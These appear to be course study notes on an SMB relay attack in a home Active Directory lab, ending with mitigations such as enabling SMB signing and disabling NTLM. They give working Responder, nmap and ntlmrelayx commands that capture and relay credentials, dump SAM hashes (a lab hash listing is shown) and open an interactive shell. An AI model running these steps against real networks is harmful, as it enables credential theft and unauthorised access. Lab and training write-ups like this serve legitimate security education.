#cybersecurity #hacking #penetration-testing 
#active-directory #smb 

# SMB Relay Attack

## SMB Relay Attacks Overview

#### What is SMB Relay?

Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access

#### Requirements

-   ﻿﻿SMB signing must be disabled on the target
-   ﻿﻿Relayed user credentials must be admin on machine

>Note: In this case Vegeta is admin on both the Planet Vegeta Machine and Earth Machine

1. Edit the responder configuration file ```gedit Responder.conf```
![](https://i.imgur.com/zMDNVcs.png)
2. Run Responder ```python Responder.py -| tun0 -dw```
3. Set up the relay ```python ntlmrelayx.py -tf targets.txt -smb2support```
4. An event occurs: point the Win10box at a machine but DNS fails, responder kicks in and relays creds to another machine
5. Credentials are relayed to another machine

>Vegeta is an admin on the Earth machine too so if his hash is relayed to the Earth Machine we should be able to get access to that machine as well

![](https://i.imgur.com/mfo883Z.png)

## Discovering Hosts with SMB Signing Disabled

Several ways to do this:
- Nessus
- Nmap
- Search github for smb checker

### NMAP Way

```bash
nmap --script=smb2-security-mode.nse -p445 192.168.2.0/24
```

Output:
![](https://i.imgur.com/CXIZBIQ.png)

We can see the server (192.168.2.135) has signing required but the individual windows 10 machines do not:

![](https://i.imgur.com/vDnBc5f.png)

Create a ``targets.txt`` file with ``192.168.2.137``: Win10-Earth Machine

## SMB Relay Attack Part 1

Need to turn off SMB and HTTP:

![](https://i.imgur.com/zMDNVcs.png)

Run responder

```bash
repsonder -I eth0 -dw
```

![](https://i.imgur.com/EAPpNEU.png)

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

Point my Win10-Vegeta Machine at my Attack Machine (Kali Attack Box)
It responds with an error but dumps the SAM hash because Vegeta is admin on the Win10-Earth Machine as well

![](https://i.imgur.com/UqCRwgH.png)

SAM Hash:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:bcd858e95a29844cea73b5bc3bf76117:::
Goku:1003:aad3b435b51404eeaad3b435b51404ee:403f92cda3c8066381327fba611a6a9e:::
```

## SMB Relay Attack Part 2

Get an interactive shell from the SMB relay attack:

```bash
ntlmrelayx.py -tf targets.txt -smb2support -i
```

Again I point my Win10-Vegeta Machine at my Attack Machine (Kali Attack Box). This is the "event" where DNS fails and the SMB Relay begins.

![](https://i.imgur.com/6v6Ptex.png)

```bash
nc 127.0.0.1 11000
```

![](https://i.imgur.com/WW36jQA.png)


Rewatch the end of https://academy.tcm-sec.com/courses/1152300/lectures/24780884


## SMB Relay Attack Defenses : Mitigation Strategies

### Enable SMB Signing on all devices
Pro: Completely stops the attack
Con: Can cause performance issues with file copies
### Disable NTLM authentication on network
Pro: Completely stops the attack
Con: If Kerberos stops working, Windows defaults back to NTLM
### Account tiering:
Pro: Limits domain admins to specific tasks (e.g. only log onto servers with need for DA)
Con: Enforcing the policy may be difficult
### Local admin restriction:
Pro: Can prevent a lot of lateral movement
Con: Potential increase in the amount of service desk tickets